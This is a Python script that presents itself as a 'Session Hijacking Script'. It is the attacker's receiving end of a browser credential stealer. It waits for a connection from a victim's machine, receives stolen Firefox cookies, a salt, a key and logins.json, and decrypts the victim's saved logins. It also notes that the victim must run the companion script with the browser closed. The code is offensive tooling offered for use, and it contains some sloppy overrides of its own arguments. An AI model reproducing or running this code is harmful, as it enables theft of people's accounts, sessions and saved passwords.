from modules.core.Ui.AsciiArt import AsciiArt
from modules.core.Ui.MarkdownDisplay import MarkdownComponent
from modules.core.ReceiveData.ReceiverCredentials import ReceiverCredentials;
from modules.core.decryptData.CookiesDecrypter import CookieesDecrypter


import argparse, re, sys, time, json, base64





def main():

    #Parameters with console
    parser = argparse.ArgumentParser(description='Session Hijacking Script');

    parser.add_argument("-ip", "--VictimIP", required=True, type=str, help="Victim's IP to receive the data");
    parser.add_argument("-p", "--ConnectionPort", required=False, type=int, default=8000, help="Connection port to receive cookies");


    args = parser.parse_args();
    ip = args.VictimIP;
    port = args.ConnectionPort; 






    # if (not re.search(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", ip)):
    #     print("Error! Invalid IP")
    #     sys.exit()



    # Drawing cover
    asciiR = AsciiArt("Cat Hijacking ", "sblood", "cyan");

    ip = "192.168.1.100"
    port = "8080"

    
    with open("./assets/cover.md", "r") as file:
        markdownData = file.read().format(asciiArt=asciiR.GenerateAscii(), ip=ip, port=port);


    markdownRender = MarkdownComponent(markdownData)
    markdownRender.Draw()    


    asciiR.Warn("Wait for connection with the victim!");


    for i in range(5):
        try: 
            asciiR.Info("Trying to establish connection..")
            receiver = ReceiverCredentials("127.0.0.1", 3000);
            data = receiver.ReceiverPackage();
            break;

        except:
            asciiR.Failure(f"Victim not connected: Attempt: {i + 1}");
            if(i == 4): sys.exit() 
            time.sleep(1)


    asciiR.Success("Established connection!!");

    if(data["cookies"] == 'Database is locked database is locked'): 
        asciiR.Failure("Could not get tokens, make sure the victim runs the script with the browser closed");

    

    salt = base64.b64decode(data["decrypt"]["salt"].encode("utf-8"));
    baseKey = base64.b64decode(data["decrypt"]["item2"].encode("utf-8"));
    loginsData = json.loads(data["logins.json"])["logins"];
    
    decrypter = CookieesDecrypter(salt, baseKey, loginsData);


    decrypter.DecryptLogins();

    






    


    



    

    

    














    
    







if __name__ == "__main__":
    main()

